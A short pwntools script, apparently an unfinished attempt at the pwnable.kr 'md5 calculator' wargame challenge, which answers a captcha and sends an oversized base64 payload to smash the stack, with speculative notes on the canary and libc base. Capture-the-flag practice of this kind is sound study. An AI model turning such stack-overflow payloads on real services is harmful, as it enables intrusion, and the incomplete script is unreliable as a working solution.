from pwn import *
from pwnlib.util.packing import p32

p = remote('pwnable.kr', 9002)
p.recvuntil("input captcha : ")
captcha = p.recvline().strip()

# calculate canary

p.send(captcha)
print(captcha)


p.recvuntil("Encode your data with BASE64 then paste me!\n")
# stack smash
# 0xaa is the boundary
# 0x2aa = 0x200 length (including a trailing 0000
p.sendline("QUFB"*0xab)

print(p.recvall())

# base = int.from_bytes(putchar, "little") - libc.symbols['putchar']

# p.interactive()
p.close()

# pwn
# Base64Decode -> var_20ch
# cal_md5 <- var_20ch
    # -> eax -> var_210h

# could be var_20c overwriting stack addr in decode or cal_md5
# the var_20c ,,, curious why from 2ac*A the stack is smashed
# could it be captcha related? like srand?
